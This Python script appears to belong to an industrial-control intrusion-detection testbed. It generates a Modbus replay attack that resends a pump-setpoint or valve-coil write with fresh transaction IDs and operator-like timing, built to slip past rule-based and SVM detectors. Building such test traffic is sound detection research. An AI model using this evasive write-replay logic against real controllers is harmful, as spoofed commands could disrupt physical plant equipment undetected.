"""
Transaction-ID-rewriting replay - a harder replay for limitation 2.

The original replay (attacks/replay_attack.py) re-sends a captured write
byte-for-byte, so it reuses the recorded transaction ID. Both the rule-based
detector's replay_reused_txid rule and the one-class SVM's txid_delta feature
key on that reused ID. This variant removes that signal: it resends the same
captured *command* (same target, same value) but overwrites the MBAP
transaction ID with a fresh, correctly incrementing one each time, exactly as
a well-behaved master would. It also paces itself like the operator - a ~1 s
level-poll loop (cover polls) with each resend placed 1-5 ms after one of its
own polls - so neither the transaction-ID nor the inter-arrival timing
separates it any more.

What is left is the one thing it cannot hide: the same command landing on the
same register over and over. That is what the value-change features
(features.py: repeat_run, write_step) are meant to catch, since the operator's
traffic almost never repeats an identical write.

It reports its source port (`SOURCE_PORT=<n>`), one `PACKET=<json>` record per
request (so the labeler can match each by exact bytes), and its drawn
parameters (`PARAMS=<json>`). With --seed the command, count and spacing are
drawn reproducibly; without one a fixed default is used.

Usage (normally invoked by a scenario orchestrator):
    python attacks/txid_replay.py [--seed N] [--src-ip 127.0.0.66]
"""

import json
import random
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import (log_packet, parse_transaction_id, read_holding,  # noqa: E402
                           write_single_coil, write_single_register)

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_LEVEL = 0
HR_PUMP_SETPOINT = 1
COIL_INLET_VALVE = 0
COIL_OUTLET_VALVE = 1

POLL_INTERVAL = 1.0
POLL_JITTER = 0.25
WRITE_AFTER_POLL = (0.001, 0.005)   # seconds: inside the operator's gap


def plan(seed: int | None = None) -> dict:
    """The replayed command and how it is re-sent. Fixed unless seeded."""
    if seed is None:
        return {"target": "setpoint", "address": HR_PUMP_SETPOINT, "value": 55,
                "start_txid": 0x0100, "count": 8}
    rng = random.Random(seed)
    p = {"start_txid": rng.randrange(0x8000), "count": rng.randint(3, 12)}
    if rng.random() < 0.7:
        p.update(target="setpoint", address=HR_PUMP_SETPOINT,
                 value=rng.randrange(20, 95, 5))
    else:
        p.update(target="coil", address=rng.choice([COIL_INLET_VALVE, COIL_OUTLET_VALVE]),
                 value=rng.choice([0, 1]))
    return p


def frame_with_txid(p: dict, txid: int) -> bytes:
    if p["target"] == "coil":
        return write_single_coil(txid, p["address"], on=bool(p["value"]))
    return write_single_register(txid, p["address"], p["value"])


def parse_arg(argv, name):
    return argv[argv.index(name) + 1] if name in argv else None


def connect(src_ip: str | None) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if src_ip:
        sock.bind((src_ip, 0))
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def send(sock, frame, kind, describe):
    log_packet(frame, kind, describe)
    sock.sendall(frame)
    try:
        sock.recv(256)
    except OSError:
        pass


def main() -> None:
    seed = parse_arg(sys.argv, "--seed")
    src_ip = parse_arg(sys.argv, "--src-ip")
    rng = random.Random(int(seed) if seed is not None else 0)
    p = plan(int(seed) if seed is not None else None)
    print("PARAMS=" + json.dumps(p), flush=True)

    sock = connect(src_ip)
    print(f"SOURCE_PORT={sock.getsockname()[1]}", flush=True)

    # Unlike the byte-for-byte replay, the originally recorded frame is never
    # put back on the wire here (its reused txid would be the giveaway); only
    # the rewritten resends below are transmitted, so nothing is logged as a
    # seed. Each resend carries the next transaction ID and follows one of the
    # attacker's own cover polls by a few ms, so framing and timing both look
    # routine; only the content (the same command, repeated) is unauthorized.
    txid = p["start_txid"] + 1
    for i in range(p["count"]):
        send(sock, read_holding(txid, HR_LEVEL, 1), "cover", f"cover poll {i + 1}")
        txid += 1
        time.sleep(rng.uniform(*WRITE_AFTER_POLL))
        frame = frame_with_txid(p, txid)
        send(sock, frame, "attack", f"txid-rewritten resend {i + 1}/{p['count']} "
                                    f"(fresh txid 0x{txid & 0xFFFF:04X})")
        print(f"[txid-replay] resent command {i + 1}/{p['count']} "
              f"with fresh txid 0x{parse_transaction_id(frame):04X}")
        txid += 1
        time.sleep(max(0.1, POLL_INTERVAL + rng.uniform(-POLL_JITTER, POLL_JITTER)))

    sock.close()
    print("[txid-replay] done.")


if __name__ == "__main__":
    main()
